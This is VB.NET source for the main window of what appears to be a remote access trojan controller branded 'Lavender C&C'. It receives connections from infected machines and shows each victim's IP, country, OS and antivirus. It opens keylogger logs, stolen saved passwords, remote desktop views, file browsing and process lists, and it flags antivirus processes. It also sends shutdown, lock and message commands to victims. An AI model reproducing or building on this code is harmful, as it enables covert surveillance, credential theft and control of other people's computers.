Imports System.Net
Imports System.Net.Sockets
Imports MaxMind.Db
Imports MaxMind.GeoIP2
Imports System.Security.Cryptography
Imports LavenderControl.Crypt.RSA
Imports System.IO
Imports System.Text
Imports System.Runtime.InteropServices

Public Class Main
    Dim sock As New TcpClient()
    Dim ip As IPAddress = IPAddress.Parse("127.0.0.1")
    Dim port As Integer = 6961
    Public Shared Sep As String = "*%|%*" ''Separator
    Public Sz As Size
    Public CanClose As Boolean = True
    Public WithEvents Second As New Timer
    Public WithEvents S As SocketServer
    Public Shared pw As String = "hinki"
    Dim infotimeout As Integer
    Public cfr As String = My.Application.Info.DirectoryPath
    Public cid As String ''current id
    Public cidf As String ''folder path for current client's files
    Public klf As String 'keylogs file current id
    Public pf As String ''profile folder
    Public cpf As String ''current profile

    <DllImport("uxtheme", ExactSpelling:=True, CharSet:=CharSet.Unicode)> _
    Public Shared Function SetWindowTheme(hWnd As IntPtr, textSubAppName As [String], textSubIdList As [String]) As Int32 ''unthemed controls
    End Function

    Function Xord(ByVal str As String, ByVal key As String)
        Dim i As Short
        Xord = ""
        Dim KeyChar As Integer
        KeyChar = Asc(key)
        For i = 1 To Len(str)
            Xord &=
               Chr(KeyChar Xor
               Asc(Mid(str, i, 1)))
        Next
    End Function

    'Sub Terminate()
    '    If sock.Connected = True Then
    '        InfoLabel.Text = "Sending terminate signal"
    '        Dat(10, "0")
    '        sock.Close()
    '    End If
    'End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        My.Settings.Save()
        If CanClose Then
            ErrorLabel.Text = "Exiting"
            S.stops()
            Application.Exit()
        Else
            e.Cancel = True
        End If
    End Sub


    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        S = New SocketServer
        'Turn on the update timer
        Second.Enabled = True
        Second.Interval = 100
        Second.Start()
        ErrorLabel.Text = ""
        Tabs.Visible = False
        PasswordTextbox.Text = pw
        ShowPasswordButton.BringToFront()
        ShowPasswordButton.Text = ""
        ''vk.AssignControl(PasswordTextbox)


        pf = cfr & Path.DirectorySeparatorChar & "profiles"
        Try
            Dim di As New DirectoryInfo(pf)
            If Not di.Exists Then
                di.Create()
            End If
        Catch ex As Exception
            MsgBox("Profiles folder could not be created!" & vbNewLine & ex.Message)
        End Try
    End Sub

    Private Sub Second_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Second.Tick
        ''Get port from settings
        If Spinner.Visible = True Then
            MainInfoLabel.Text = L1.Items.Count & " Client(s) online"
        Else
            MainInfoLabel.Text = ""
        End If
    End Sub

    Private Sub Main_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
    End Sub

#Region "Server Events"
    ''' <summary>
    ''' Handles client disconnect
    ''' </summary>
    ''' <param name="sock">Socket</param>
    ''' <remarks></remarks>
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Try
            L1.Items(sock.ToString).Remove()
        Catch ex As Exception
        End Try
    End Sub
    ''' <summary>
    ''' Handles client connect
    ''' </summary>
    ''' <param name="sock">Socket</param>
    ''' <remarks></remarks>
    Sub Connected(ByVal sock As Integer) Handles S.Connected
        S.Send(sock, "info" & Sep & pw) ' Get PC Name (follow up when PC name recieved)
    End Sub

    Delegate Sub _Datad(ByVal info As Data)
    ''' <summary>
    ''' Handles data recieved?
    ''' </summary>
    ''' <param name="info">Data</param>
    ''' <remarks></remarks>
    Sub data(ByVal info As Data) Handles S.Datad
        Dim a As String = info.GetData
        Dim aa As String() = a.Split("|")
        Select Case aa(0)
            Case "tt" ''is this error?
                MsgBox("Error") ''TODO: Improve
        End Select
    End Sub

    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    ''' <summary>
    ''' Handles data recieved
    ''' </summary>
    ''' <param name="sock">Socket</param>
    ''' <param name="B">Data as bytes</param>
    ''' <remarks></remarks>
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = Crypt.RC4.rc4(BS(B), pw)
        Dim A As String() = Split(T, Sep)
        If Split(BS(B), Sep)(0) = "@" Then ''if screen data
            T = BS(B)
            A = Split(T, Sep)
        End If
        Try
            Select Case A(0)
                Case "info" ' Client Sent the PC name (follows up the initial connect)
                    If L1.Items.Item(sock.ToString) Is Nothing Then
                        Dim L = L1.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(A(3))))
                        L.ImageKey = "zz.png"
                        L.SubItems.Add(S.IP(sock)) ''ip
                        L.SubItems.Add(A(2)) ''computer/user

                        ''L.SubItems.Add(A(3)) ''country
                        Try
                            Using rdr As New DatabaseReader("GeoLite2-Country.mmdb")
                                L.SubItems.Add(rdr.Country(S.IP(sock)).Country.Name)
                                L.ImageKey = rdr.Country(S.IP(sock)).Country.IsoCode & ".png"
                            End Using
                        Catch ex As Exception
                            L.SubItems.Add("(" & A(3) & ")")
                        End Try

                        L.SubItems.Add(A(4)) ''os
                        L.SubItems.Add(A(5)) ''antivirus
                        L.SubItems.Add(" ") ''active windows

                        L.ToolTipText = sock

                        ''show tooltip
                        TrayIcon.BalloonTipIcon = ToolTipIcon.Info
                        TrayIcon.BalloonTipTitle = "Lavender C&C"
                        TrayIcon.BalloonTipText = "Client connected: [ ID : " & A(1) & " IP : " & S.IP(sock) & " Country : " & A(3) & " ]"
                        TrayIcon.ShowBalloonTip(1)


                    End If
                Case "AW" ''active window(s?)
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).SubItems(6).Text = A(1)
                            Exit For
                        End If
                    Next
                Case "F" ''file somthing? duplicate server
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).ForeColor = Color.Black
                            Exit For
                        End If
                    Next
                Case "||||" ''open taskmanager
                    If My.Application.OpenForms("||||" & sock) IsNot Nothing Then Exit Sub ''test if taskman for socket already open
                    If Me.InvokeRequired Then ''???
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New TaskMan
                    f.sock = sock ''taskman socket
                    f.Name = "||||" & sock ''name of new taskman
                    f.Text = f.Text & S.IP(sock) ''title += ip
                    f.Show() ''show taskman
                Case "openlo" ''open keylogger window
                    If My.Application.OpenForms("openlo" & sock) IsNot Nothing Then Exit Sub ''test if logs for socket already open
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New KeyLogger
                    f.sock = sock ''keylogger socket
                    f.Name = "openlo" & sock ''name of new window
                    f.Text = f.Text & S.IP(sock) ''title += ip
                    f.Show() ''show

                    ''todo??/
                    ' Case "logf"
                    '    Dim F As Form7 = My.Application.OpenForms("openlo" & sock)
                    '   Dim logsf As String() = Split(A(1), "|")
                    '  For i As Integer = 0 To logsf.Length - 2
                    'Dim ii As New ListViewItem
                    'ii.Text = logsf(i)
                    'f.ListView1.Items.Add(ii)
                    'Next

                Case "getlog" ''set keylogger texbox to keylogs
                    Dim F As KeyLogger = My.Application.OpenForms("openlo" & sock) ''find window from socket
                    klf = cidf & Path.DirectorySeparatorChar & "keylogs.html"
                    Dim final As String = A(1)
                    final = A(1).Insert(0, "<html style=""font-family:Segoe UI, Helvetica Neue, Arial, sans-serif""><head><title>" & L1.Items(sock.ToString).SubItems(2).Text & "|" & S.IP(sock) & "</title></head><body><style>.k { color:#080; } .f { color:#F80; }</style><h1 style=""text-align:center; color: #B07;"">" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</h1>")
                    final = final.Insert(final.Length, "</body><html>")
                    IO.File.WriteAllText(klf, final, Encoding.UTF8) ''write keylogs to file

                    F.WebBrowser.DocumentText = IO.File.ReadAllText(klf).ToString ''set browser component to log file
                Case "dellog"
                    MsgBox("Logs deleted from host")
                Case "|||"
                    If My.Application.OpenForms("|||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New FileManager
                    fm.sock = sock
                    fm.Name = "|||" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.Show()
                Case "util" ''utilities
                    If My.Application.OpenForms("util" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Utilities
                    fm.sock = sock
                    fm.Name = "util" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.f = Me
                    fm.Show()
                Case "++" ''saved passwords
                    If My.Application.OpenForms("++" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Passwords
                    fm.sock = sock
                    fm.Name = "++" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.Show()
                    S.Send(sock, "ppww")
                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Remote
                    f.F = Me
                    f.Sock = sock
                    f.Name = "!" & sock
                    f.Sz = New Size(A(1), A(2))
                    f.Show()
                Case "@" ' recieve screen
                    Dim F As Remote = My.Application.OpenForms("!" & sock)

                    If F IsNot Nothing Then
                        If A(1).Length = 1 Then
                            F.Text = "Remote Desktop  " & "Size: " & siz(B.Length) & " ,No Changes"
                            If F.active Then
                                S.Send(sock, "@" & Sep & F.C1.SelectedIndex & Sep & F.C2.Text & Sep & F.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(B, "@" & Sep)(1)
                        F.PktToImage(BB)
                    End If
                    ''For now fuck text to speech shit
                    'Case "opentto"
                    '    If My.Application.OpenForms("opentto" & sock) IsNot Nothing Then Exit Sub
                    '    If Me.InvokeRequired Then
                    '        Dim j As New _Data(AddressOf data)
                    '        Me.Invoke(j, New Object() {sock, B})
                    '        Exit Sub
                    '    End If
                    '    Dim f As New Form10

                    '    f.sock = sock
                    '    f.Name = "opentto" & sock
                    '    f.Text = f.Text + S.IP(sock)
                    '    f.Show()


                Case "FileManager"
                    Dim fff As FileManager = My.Application.OpenForms("|||" & sock)
                    If A(1) = "Error" Then
                        fff.FileListView.Items.Clear()
                        fff.FileListView.Items.Add("Access Denied")
                        fff.donewait()
                    Else
                        fff.FileListView.Items.Clear()
                        fff.FileListView.Items.Add("Populating list...")
                        fff.FileListView.BeginUpdate() ''freezes list until endupdate()
                        fff.FileListView.Items.Clear()
                        Dim icons() As Image
                        Dim iconsi As Integer = 0
                        Dim hasicons As Boolean = False

                        Dim allFiles As String() = Split(A(1), "^||^") ''CHANGE!
                        If fff.IsHandleCreated Then
                            For i = 0 To allFiles.Length - 2
                                Dim itm As New ListViewItem
                                itm.Text = allFiles(i)
                                itm.SubItems.Add(allFiles(i + 1))
                                If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Rem]") And Not itm.Text.StartsWith("[Folder]") Then
                                    Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                    If fsize > 1073741824 Then
                                        Dim size As Double = fsize / 1073741824
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                    ElseIf fsize > 1048576 Then
                                        Dim size As Double = fsize / 1048576
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                    ElseIf fsize > 1024 Then
                                        Dim size As Double = fsize / 1024
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                    Else
                                        itm.SubItems(1).Text = fsize.ToString & " B"
                                    End If
                                    itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                End If

                                If itm.Text.StartsWith("[Drive]C") Then
                                    itm.ImageIndex = 1
                                    itm.Text = itm.Text.Substring(7)
                                    itm.SubItems.Add("Windows Disk")
                                ElseIf itm.Text.StartsWith("[Drive]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(7)
                                    itm.SubItems.Add("Local Disk")
                                ElseIf itm.Text.StartsWith("[Rem]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(5)
                                    itm.SubItems.Add("Removable Disk")
                                ElseIf itm.Text.StartsWith("[CD]") Then
                                    itm.ImageIndex = 2
                                    itm.Text = itm.Text.Substring(4)
                                    itm.SubItems.Add("Disk Drive")
                                ElseIf itm.Text.StartsWith("[Folder]") Then
                                    itm.ImageIndex = 3
                                    itm.Text = itm.Text.Substring(8)
                                    itm.SubItems.Add("DIR")
                                Else
                                    hasicons = True
                                    If itm.Text.ToLower.EndsWith(".exe") Then
                                        itm.SubItems.Add("Application")
                                    ElseIf itm.Text.ToLower.EndsWith(".zip") Or itm.Text.ToLower.EndsWith(".rar") Or itm.Text.ToLower.EndsWith(".7z") Or itm.Text.ToLower.EndsWith(".bz2") Or itm.Text.ToLower.EndsWith(".tar") Or itm.Text.ToLower.EndsWith(".tar.gz") Then
                                        itm.SubItems.Add("Archive")
                                    ElseIf itm.Text.ToLower.EndsWith(".msi") Then
                                        itm.SubItems.Add("Windows Installer Package")
                                    ElseIf itm.Text.ToLower.EndsWith(".rtf") Or itm.Text.ToLower.EndsWith(".txt") Then
                                        itm.SubItems.Add("Text Document")
                                    ElseIf itm.Text.ToLower.EndsWith(".dll") Then
                                        itm.SubItems.Add("Application Extension")
                                    ElseIf itm.Text.ToLower.EndsWith(".reg") Then
                                        itm.SubItems.Add("Registration Entries")
                                    ElseIf itm.Text.ToLower.EndsWith(".jpg") Or itm.Text.ToLower.EndsWith(".jpeg") Or itm.Text.ToLower.EndsWith(".tif") Then
                                        itm.SubItems.Add("JPG File")
                                    ElseIf itm.Text.ToLower.EndsWith(".gif") Then
                                        itm.SubItems.Add("GIF File")
                                    ElseIf itm.Text.ToLower.EndsWith(".png") Then
                                        itm.SubItems.Add("PNG File")
                                    ElseIf itm.Text.ToLower.EndsWith(".bmp") Then
                                        itm.SubItems.Add("BMP File")
                                    ElseIf itm.Text.ToLower.EndsWith(".doc") Or itm.Text.ToLower.EndsWith(".docx") Or itm.Text.ToLower.EndsWith(".docm") Or itm.Text.ToLower.EndsWith(".odt") Then ''add iconz!!
                                        itm.SubItems.Add("Word Document")
                                    ElseIf itm.Text.ToLower.EndsWith(".ppt") Or itm.Text.ToLower.EndsWith(".pptx") Or itm.Text.ToLower.EndsWith(".pptm") Or itm.Text.ToLower.EndsWith(".ppsx") Or itm.Text.ToLower.EndsWith(".odp") Then
                                        itm.SubItems.Add("PowerPoint Presentation")
                                    ElseIf itm.Text.ToLower.EndsWith(".xls") Or itm.Text.ToLower.EndsWith(".xlsx") Or itm.Text.ToLower.EndsWith(".xlsm") Or itm.Text.ToLower.EndsWith(".xlsb") Or itm.Text.ToLower.EndsWith(".ods") Then
                                        itm.SubItems.Add("Excel Worksheet")
                                    ElseIf itm.Text.ToLower.EndsWith(".pdf") Then
                                        itm.SubItems.Add("PDF")
                                    ElseIf itm.Text.ToLower.EndsWith(".html") Or itm.Text.ToLower.EndsWith(".htm") Then
                                        itm.SubItems.Add("HTML Document")
                                    ElseIf itm.Text.ToLower.EndsWith(".wav") Or itm.Text.ToLower.EndsWith(".mp3") Or itm.Text.ToLower.EndsWith(".midi") Or itm.Text.ToLower.EndsWith(".mdi") Or itm.Text.ToLower.EndsWith(".m4a") Or itm.Text.ToLower.EndsWith(".aiff") Or itm.Text.ToLower.EndsWith(".flac") Or itm.Text.ToLower.EndsWith(".mka") Or itm.Text.ToLower.EndsWith(".aac") Or itm.Text.ToLower.EndsWith(".aif") Or itm.Text.ToLower.EndsWith(".cda") Or itm.Text.ToLower.EndsWith(".m4a") Or itm.Text.ToLower.EndsWith(".ogg") Then
                                        itm.SubItems.Add("Audio File") ''
                                    ElseIf itm.Text.ToLower.EndsWith(".flv") Or itm.Text.ToLower.EndsWith(".avi") Or itm.Text.ToLower.EndsWith(".mts") Or itm.Text.ToLower.EndsWith(".3gp") Or itm.Text.ToLower.EndsWith(".mkv") Or itm.Text.ToLower.EndsWith(".mov") Or itm.Text.ToLower.EndsWith(".mp4") Or itm.Text.ToLower.EndsWith(".mpeg") Or itm.Text.ToLower.EndsWith(".mpg") Or itm.Text.ToLower.EndsWith(".webm") Then
                                        itm.SubItems.Add("Video File")
                                    ElseIf itm.Text.ToLower.EndsWith(".jar") Then
                                        itm.SubItems.Add("Excecutable Jar File")
                                    ElseIf itm.Text.ToLower.EndsWith(".bat") Then
                                        itm.SubItems.Add("Batch File")
                                    Else
                                        Dim ii As String() = itm.Text.Split(".")
                                        itm.SubItems.Add(ii(ii.Length - 1).ToUpper & " File") ''last text after period = extension
                                    End If
                                    ''fff.ImgList.Images.Add(Convert.ToBase64String(Icon.ExtractAssociatedIcon(itm.Text)))
                                    If Not allFiles(i + 2) = "x" Then ''if not x for no icon then get icon C:\Users\Henry\Documents\Output
                                        Dim z As System.Drawing.Bitmap = BytesToIcon(Convert.FromBase64String(allFiles(i + 2)))
                                        ReDim Preserve icons(iconsi)
                                        icons(iconsi) = z
                                        iconsi += 1
                                        ''fff.ImgListL.Images.Add(z)
                                        ''fff.ImgListS.Images.Add(z)
                                        itm.ImageIndex = iconsi - 1 + 4
                                        ''MsgBox(fff.ImgListL.Images.Count + 4)
                                    End If

                                End If
                                fff.FileListView.Items.Add(itm)
                                i += 2
                            Next

                            fff.ImgListL.Images.Clear()
                            ''fff.ImgListS.Images.Clear()
                            fff.ImgListL.Images.Add(My.Resources.drive) ''0
                            ''fff.ImgListS.Images.Add(My.Resources.drive)
                            fff.ImgListL.Images.Add(My.Resources.drivewin) ''1
                            ''fff.ImgListS.Images.Add(My.Resources.drivewin)
                            fff.ImgListL.Images.Add(My.Resources.diskdrive) ''2
                            ''fff.ImgListS.Images.Add(My.Resources.diskdrive)
                            fff.ImgListL.Images.Add(My.Resources.folder) ''3
                            ''fff.ImgListS.Images.Add(My.Resources.folder)
                            If hasicons Then
                                fff.ImgListL.Images.AddRange(icons)
                            End If
                            fff.FileListView.EndUpdate()
                            fff.donewait()
                        End If
                    End If
                Case "ProcessManager"
                    Dim f As TaskMan = My.Application.OpenForms("||||" & sock)
                    Dim r As String() = Split(A(1), "^&&^") ''0 index is total ram
                    Dim allProcess As String() = Split(r(3), "^||^")
                    Dim rav As Long = Math.Round((Long.Parse(r(0)) - Long.Parse(r(1))) / Long.Parse(r(0)) * 100, 0) ''available ram

                    f.ListView1.Items.Clear()
                    f.ListView1.Items.Add("Populating list...").Group = f.ListView1.Groups(0)
                    f.ListView1.BeginUpdate()
                    f.ListView1.Items.Clear()
                    Dim icons() As Image
                    Dim iconsi As Integer = 0
                    f.ImageList1.Images.Clear()

                    Dim bi As Integer = 0 ''background process count
                    Dim ai As Integer = 0 ''app count
                    For i = 0 To allProcess.Length - 2
                        If f.IsHandleCreated Then
                            Dim itm As New ListViewItem

                            itm.Text = allProcess(i)


                            If allProcess(i).EndsWith("[Suspended]") Then ''if process is suspended or special case
                                itm.BackColor = Color.LightGray
                            ElseIf allProcess(i + 1) = 0 Then
                                itm.BackColor = Color.Gray
                            Else
                                itm.UseItemStyleForSubItems = False

                                Dim antivirus As String = ""

                                ''stupid but necessary
                                If allProcess(i).ToLower = "ekrn" Then
                                    antivirus = "NOD32"
                                ElseIf allProcess(i).ToLower = "avgcc" Then
                                    antivirus = "AVG"
                                ElseIf allProcess(i).ToLower = "avgnt" Then
                                    antivirus = "Avira"
                                ElseIf allProcess(i).ToLower = "ahnsd" Then
                                    antivirus = "AhnLab-V3"
                                ElseIf allProcess(i).ToLower = "bdss" Then
                                    antivirus = "BitDefender"
                                ElseIf allProcess(i).ToLower = "bdv" Then
                                    antivirus = "ByteHero"
                                ElseIf allProcess(i).ToLower = "clamav" Then
                                    antivirus = "ClamAV"
                                ElseIf allProcess(i).ToLower = "fpavserver" Then
                                    antivirus = "F-Prot"
                                ElseIf allProcess(i).ToLower = "fssm32" Then
                                    antivirus = "F-Secure"
                                ElseIf allProcess(i).ToLower = "avkcl" Then
                                    antivirus = "GData"
                                ElseIf allProcess(i).ToLower = "engface" Then
                                    antivirus = "Jiangmin"
                                ElseIf allProcess(i).ToLower = "avp" Then
                                    antivirus = "Kaspersky"
                                ElseIf allProcess(i).ToLower = "updaterui" Then
                                    antivirus = "McAfee"
                                ElseIf allProcess(i).ToLower = "msmpeng" Then
                                    antivirus = "MSE/Defender"
                                ElseIf allProcess(i).ToLower = "zanda" Then
                                    antivirus = "Norman"
                                ElseIf allProcess(i).ToLower = "npupdate" Then
                                    antivirus = "nProtect"
                                ElseIf allProcess(i).ToLower = "inicio" Then
                                    antivirus = "Panda"
                                ElseIf allProcess(i).ToLower = "sagui" Then
                                    antivirus = "Prevx"
                                ElseIf allProcess(i).ToLower = "Norman" Then
                                    antivirus = "Sophos"
                                ElseIf allProcess(i).ToLower = "savservice" Then
                                    antivirus = "Sophos"
                                ElseIf allProcess(i).ToLower = "saswinlo" Then
                                    antivirus = "SUPERAntiSpyware"
                                ElseIf allProcess(i).ToLower = "spbbcsvc" Then
                                    antivirus = "Symantec"
                                ElseIf allProcess(i).ToLower = "thd32" Then
                                    antivirus = "TheHacker"
                                ElseIf allProcess(i).ToLower = "ufseagnt" Then
                                    antivirus = "TrendMicro"
                                ElseIf allProcess(i).ToLower = "dllhook" Then
                                    antivirus = "VBA32"
                                ElseIf allProcess(i).ToLower = "sbamtray" Then
                                    antivirus = "VIPRE"
                                ElseIf allProcess(i).ToLower = "vrmonsvc" Then
                                    antivirus = "ViRobot"
                                ElseIf allProcess(i).ToLower = "vbcalrt" Then
                                    antivirus = "VirusBuster"
                                ElseIf allProcess(i).ToLower = "mbam" Then
                                    antivirus = "Malwarebytes Anti-Malware GUI"
                                ElseIf allProcess(i).ToLower = "mbamresearch" Then
                                    antivirus = "Malwarebytes Anti-Malware"
                                ElseIf allProcess(i).ToLower = "mbamservice" Then
                                    antivirus = "Malwarebytes Anti-Malware Service"
                                Else
                                    antivirus = ""
                                End If

                                If Not antivirus = "" Then
                                    itm.BackColor = Color.LightSalmon
                                    itm.ToolTipText = "Antivirus Program: " & antivirus
                                Else
                                    itm.ToolTipText = Nothing ''allProcess(i)
                                End If
                            End If

                            itm.SubItems.Add(allProcess(i + 1)) ''pid
                            itm.SubItems.Add(allProcess(i + 2) & "%").BackColor = PercentColor(Double.Parse(allProcess(i + 2))) ''cpu

                            ''ram usage
                            Dim rper As Double = Long.Parse(allProcess(i + 3)) / r(0) * 100 ''percentage ram usage
                            Dim rs As String
                            If Long.Parse(allProcess(i + 3)) > 1073741824 Then
                                Dim size As Double = Long.Parse(allProcess(i + 3)) / 1073741824
                                rs = Math.Round(size, 1).ToString & " GB"
                            ElseIf Long.Parse(allProcess(i + 3)) > 1048576 Then
                                Dim size As Double = Long.Parse(allProcess(i + 3)) / 1048576
                                rs = Math.Round(size, 1).ToString & " MB"
                            ElseIf Long.Parse(allProcess(i + 3)) > 1024 Then
                                Dim size As Double = Long.Parse(allProcess(i + 3)) / 1024
                                rs = Math.Round(size, 1).ToString & " KB"
                            Else
                                rs = Math.Round(Long.Parse(allProcess(i + 3)), 1).ToString & " B"
                            End If
                            ''Dim rperr As Double = Math.Round(rper, 2)
                            itm.SubItems.Add(rs).BackColor = PercentColor(rper)

                            itm.SubItems.Add(allProcess(i + 4)) ''window title
                            If allProcess(i + 4) = "" Then ''if the windows title is empty then it's a background application
                                itm.Group = f.ListView1.Groups(2)
                                bi += 1
                            Else
                                itm.Group = f.ListView1.Groups(1)
                                ai += 1
                            End If

                            itm.SubItems.Add(allProcess(i + 5)) ''command line

                            f.ListView1.Items.Add(itm)

                            Dim z As System.Drawing.Bitmap
                            If Not allProcess(i + 6) = "x" Then
                                z = BytesToIcon(Convert.FromBase64String(allProcess(i + 6))) ''icon
                            Else
                                z = My.Resources.application.ToBitmap
                            End If

                            ReDim Preserve icons(iconsi)
                            icons(iconsi) = z
                            iconsi += 1
                            ''fff.ImgListL.Images.Add(z)
                            ''fff.ImgListS.Images.Add(z)
                            itm.ImageIndex = iconsi - 1

                            i += 6
                        End If
                    Next
                    ''f.ListView1.Columns.Item(3).Text = "RAM " & rav.ToString & "%"
                    f.InfoToolTip.ShowAlways = True
                    f.RAMVPB.Value = rav
                    f.InfoToolTip.SetToolTip(f.RAMVPB, "RAM Usage: " & rav & "%")
                    f.CPUVPB.Value = CInt(Fix(r(2)))
                    f.InfoToolTip.SetToolTip(f.CPUVPB, "CPU Usage: " & CInt(Fix(r(2))) & "%")
                    f.ImageList1.Images.AddRange(icons)
                    'Try
                    '    f.ListView1.Groups("AppGroup").Header = "Apps (" & ai & ")"
                    '    f.ListView1.Groups("BackgroundGroup").Header = "Background processes (" & bi & ")"
                    'Catch ex As Exception
                    '    MsgBox(ex.Message)
                    'End Try

                    f.ListView1.EndUpdate()

                    f.donewait()
                Case "ppww"
                    Dim f As Passwords = My.Application.OpenForms("++" & sock)
                    f.clearwait()
                    f.ListView1.BeginUpdate()
                    f.ListView1.Items.Clear()
                    Dim res As String() = Split(A(1), "|^^|")
                    Dim j As Integer = 0
                    For Each s As String In res
                        Try
                            Dim aa As String() = Split(s, "|")
                            If f.IsHandleCreated Then
                                For i = 2 To aa.Length
                                    Dim ii As New ListViewItem
                                    ii.Text = aa(i)
                                    ii.SubItems.Add(aa(i + 2))
                                    ii.SubItems.Add(aa(i + 4))
                                    ii.ImageIndex = j
                                    f.ListView1.Items.Add(ii)
                                    i += 5

                                Next
                            End If
                        Catch ex As Exception
                        End Try
                        j += 1
                    Next


                    f.ListView1.EndUpdate()
                Case "specs"
                    InfoListView.Items.Add("d").SubItems.Add("s")
            End Select
        Catch ex As Exception
            MsgBox(ex.Message.ToString + Environment.NewLine + ex.StackTrace.ToString, MsgBoxStyle.Critical, "Error")
        End Try

    End Sub


#End Region

    Function PercentColor(ByVal per As Double) As Color
        If per > 50 Then
            Return Color.FromArgb(255, 55, 5)
        ElseIf per > 25 Then
            Return Color.FromArgb(255, 152, 56)
        ElseIf per > 10 Then
            Return Color.FromArgb(255, 206, 84)
        ElseIf per > 5 Then
            Return Color.FromArgb(255, 240, 114)
        ElseIf per > 1 Then
            Return Color.FromArgb(255, 248, 186)
        Else
            Return Color.White
        End If
    End Function


    Function BytesToIcon(bytes As Byte()) As Bitmap
        Using ms As New MemoryStream(bytes)
            Return New Bitmap(ms) ''.RawFormat(System.Drawing.Imaging.ImageFormat.Png)
        End Using
    End Function

    Private Sub SendButton_Click(sender As Object, e As EventArgs)  ''Send Process.start() command
        ''Sp(True)
        'If CommandTextbox.Text = "" Then
        '    ErrorLabel.Text = "Command field empty"
        'Else
        '    Dat(0, CommandTextbox.Text)
        'End If
        'Sp(False)
        'For Each x As ListViewItem In L1.SelectedItems
        '    S.Send(x.ToolTipText, "Execute" & Main.Sep & CommandTextbox.Text)
        'Next

    End Sub
#Region "Power Buttons"
    Private Sub ShutdownButton_Click(sender As Object, e As EventArgs) Handles ShutdownButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "SHD")
        Next
    End Sub

    Private Sub RestartButton_Click(sender As Object, e As EventArgs) Handles RestartButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "RST")
        Next
    End Sub

    Private Sub SleepButton_Click(sender As Object, e As EventArgs) Handles SleepButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "SLP")
        Next
    End Sub

    Private Sub LogoutButton_Click(sender As Object, e As EventArgs) Handles LogoutButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "LGF")
        Next
    End Sub

    Private Sub LockButton_Click(sender As Object, e As EventArgs) Handles LockButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "LCK")
        Next
    End Sub
#End Region

    Private Sub PViewButton_Click(sender As Object, e As EventArgs)
        TaskMan.Show()
    End Sub

    Private Sub MsgSendButton_Click(sender As Object, e As EventArgs) Handles MsgSendButton.Click  ''Send messagebox
        Dim mbmsg As String = MsgTextbox.Text
        Dim mbtp As Integer ''MsgBoxStyle
        If InfoRadio.Checked Then mbtp = 64 Else If ExclaRadio.Checked Then mbtp = 48 Else If QuestRadio.Checked Then mbtp = 32 Else If CritRadio.Checked Then mbtp = 16
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "msg" & Sep & mbmsg & Sep & mbtp.ToString)
        Next
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        'If ShowDesktopCheckbox.Checked Then
        '    For Each x As ListViewItem In L1.SelectedItems
        '        If L1.SelectedItems.Count = 1 Then
        '            S.Send(x.ToolTipText, "!!")
        '        End If
        '    Next
        'End If
        If L1.SelectedItems.Count >= 1 Then
            Tabs.Enabled = True
            Tabs.Visible = True

            cid = L1.SelectedItems.Item(0).SubItems(0).Text ''set cid to current client's ID
            cidf = cfr & Path.DirectorySeparatorChar & "hosts"
            Try
                Dim di As New DirectoryInfo(cidf)
                If Not di.Exists Then
                    di.Create()
                End If
            Catch ex As Exception
                MsgBox("Hosts folder could not be created!" & vbNewLine & ex.Message)
            End Try
